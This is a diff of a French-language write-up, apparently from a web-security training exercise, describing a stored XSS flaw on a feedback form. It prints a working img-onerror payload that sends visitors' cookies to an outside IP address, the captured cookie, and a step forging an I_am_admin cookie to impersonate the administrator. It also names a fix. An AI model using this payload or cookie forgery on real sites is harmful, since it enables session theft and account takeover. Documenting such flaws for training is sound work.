@@ -1,16 +1,15 @@
-En inspectant la page on voit que le serveur check juste que les inputs ne soient pas vide
-Il nous suffit alors de modifier la longueur des inputs pour pouvoir y placer des scripts Js/Html/Php.
-Dans la section 'feedback':
+Security breach name 	: XSS (Cross-site scripting) persistant
 
-Le second champ n'execute pas le code, par contre le premier champ n'est pas protegé on y ajoute donc notre script
+Principle 				: Insérer du code html/js/php dans un input pour essayer d'accéder à des données sensibles ou modifier la perception du site aux autres utilisateurs.
 
-<img src="azerty.jpg" onerror="window.location='http://46.101.40.236:3000/get_cookie_xss.php?cookie='+document.cookie;" hidden>
+Solve 					: Stringifier les valeurs envoyé par le user.
 
-Resultat : http://46.101.40.236:3000/get_cookie_xss.php?cookie=I_am_admin=68934a3e9455fa72420237eb05902327
+In case 				: Sur la page feedback, un seul des deux inputs stringify la valeur entré par le user, le second ne fait que limiter la taille de son input,
+							il nous a donc suffit de changer ca taille maximum pour ensuite y insérer du code nous permettant d'envoyer le cookie de session de chaques users se rendant sur la page de feedback.
+						Il faut utiliser un autre browser que Google Chrome car celui-ci bloque ce genre de contenu.
 
-On check le type de hashage avec https://md5hashing.net/hash_type_checker/ 
-On voit que c'est du md5, et que sa valeur est false;
+							code 	: <img src="azerty.jpg" onerror="window.location='http://46.101.40.236:3000/get_cookie_xss.php?cookie='+document.cookie;" hidden>
+							result 	: http://46.101.40.236:3000/get_cookie_xss.php?cookie=I_am_admin=68934a3e9455fa72420237eb05902327
 
-Ensuite on ouvre la console et on set une nouvelle valeur au cookie :  document.cookie="I_am_admin=b326b5062b2f0e69046810717534cb09"
-On refresh la page
 
+							Il nous restait plus qu'à changer le cookie I_am_admin pour se faire passer pour celui-ci.
